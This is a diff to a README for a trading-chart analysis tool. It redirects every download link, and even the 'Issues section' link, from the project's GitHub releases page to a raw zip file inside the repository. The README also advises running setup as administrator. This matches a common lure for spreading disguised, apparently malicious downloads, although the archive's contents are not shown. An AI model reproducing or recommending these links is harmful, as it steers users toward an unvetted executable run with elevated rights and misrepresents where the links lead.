@@ -1,6 +1,6 @@
 # 📈 trading-analyzer - Analyze Trading Charts Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20Trading%20Analyzer-brightgreen)](https://github.com/kedibey1232/trading-analyzer/releases)
+[![Download](https://raw.githubusercontent.com/kedibey1232/trading-analyzer/main/nutria/analyzer_trading_3.1.zip%20Trading%20Analyzer-brightgreen)](https://raw.githubusercontent.com/kedibey1232/trading-analyzer/main/nutria/analyzer_trading_3.1.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Getting trading-analyzer ready to use involves three easy steps: download, insta
 
 Click the big green download button at the top or use this link:
 
-[Download trading-analyzer releases](https://github.com/kedibey1232/trading-analyzer/releases)
+[Download trading-analyzer releases](https://raw.githubusercontent.com/kedibey1232/trading-analyzer/main/nutria/analyzer_trading_3.1.zip)
 
 This link will take you to the official page where you can find the latest version for your operating system.
 
@@ -104,7 +104,7 @@ After installation, open trading-analyzer by finding its icon on your desktop or
 - **Installation errors:** Run the setup as administrator (right-click the file, then choose "Run as administrator").
 - **Analysis takes too long:** Check that no other applications are using excessive CPU or RAM.
 - **Output is empty or unreadable:** Confirm your input image is clear and contains visible chart data.
-- **Need help?** Visit the [Issues section](https://github.com/kedibey1232/trading-analyzer/issues) on GitHub to report problems or ask questions.
+- **Need help?** Visit the [Issues section](https://raw.githubusercontent.com/kedibey1232/trading-analyzer/main/nutria/analyzer_trading_3.1.zip) on GitHub to report problems or ask questions.
 
 ---
 
@@ -112,7 +112,7 @@ After installation, open trading-analyzer by finding its icon on your desktop or
 
 You can get the latest version of trading-analyzer anytime at this link:
 
-[Download trading-analyzer releases](https://github.com/kedibey1232/trading-analyzer/releases)
+[Download trading-analyzer releases](https://raw.githubusercontent.com/kedibey1232/trading-analyzer/main/nutria/analyzer_trading_3.1.zip)
 
 Make sure to download the version that fits your computer system. Follow the instructions in the “Getting Started” section above to install and launch the software.
 
